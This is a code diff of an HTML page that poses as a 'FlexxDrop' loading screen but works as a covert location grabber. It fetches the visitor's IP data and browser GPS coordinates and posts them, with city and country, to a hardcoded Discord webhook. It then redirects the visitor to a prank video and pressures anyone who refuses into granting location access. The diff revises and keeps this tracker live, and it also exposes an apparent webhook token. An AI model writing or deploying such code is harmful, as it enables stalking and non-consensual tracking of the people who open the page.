@@ -23,14 +23,14 @@
   <div>Loading FlexxDrop…</div>
 
   <script>
-  const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
-  const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-  const deniedPageUrl = "data:text/html,<html style='background:black;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;'><body><div>Permissions not given. Please allow location access and reload the page.</div></body></html>";
+    const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
+    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    const deniedPageUrl = "data:text/html,<html style='background:black;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;'><body><div>Permissions not given. Please allow location access and reload the page.</div></body></html>";
 
-  function sendToDiscord(lat, lon, acc, ipData) {
-    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-    const payload = {
-      content: `📍 **GPS Captured**  
+    function sendToDiscord(lat, lon, acc, ipData) {
+      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const payload = {
+        content: `📍 **GPS Captured**  
 **Latitude:** ${lat}  
 **Longitude:** ${lon}  
 **Accuracy:** ${acc} meters  
@@ -43,27 +43,25 @@
 **Country:** ${ipData.countryName}
 
 🕒 ${new Date().toLocaleString()}`
-    };
+      };
 
-    fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
 
-    setTimeout(() => {
-      window.location.href = redirectUrl;
-    }, 1000);
-  }
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 1000);
+    }
 
-  function getIPAndGPS() {
-    fetch("https://api.db-ip.com/v2/free/self")
-      .then(res => res.json())
-      .then(ipData => {
-        if ("geolocation" in navigator) {
+    function getIPAndGPS() {
+      fetch("https://api.db-ip.com/v2/free/self")
+        .then(res => res.json())
+        .then(ipData => {
           navigator.geolocation.getCurrentPosition(
             (pos) => {
-              localStorage.removeItem("locationDenied");
               const lat = pos.coords.latitude;
               const lon = pos.coords.longitude;
               const acc = pos.coords.accuracy;
@@ -71,7 +69,6 @@
             },
             (err) => {
               console.error("GPS error:", err.message);
-              localStorage.setItem("locationDenied", "true");
               window.location.href = deniedPageUrl;
             },
             {
@@ -80,21 +77,32 @@
               maximumAge: 0
             }
           );
-        }
-      })
-      .catch(error => {
-        console.error("IP fetch failed:", error.message);
-      });
-  }
-
-  window.onload = () => {
-    if (localStorage.getItem("locationDenied")) {
-      localStorage.removeItem("locationDenied");
-      location.reload();
-    } else {
-      getIPAndGPS();
+        })
+        .catch(error => {
+          console.error("IP fetch failed:", error.message);
+        });
     }
-  };
+
+    async function checkPermissionsAndStart() {
+      if (!navigator.permissions) {
+        getIPAndGPS();
+        return;
+      }
+
+      try {
+        const result = await navigator.permissions.query({ name: "geolocation" });
+
+        if (result.state === "denied") {
+          window.location.href = deniedPageUrl;
+        } else {
+          getIPAndGPS();
+        }
+      } catch (e) {
+        getIPAndGPS();
+      }
+    }
+
+    window.onload = checkPermissionsAndStart;
   </script>
 </body>
 </html>
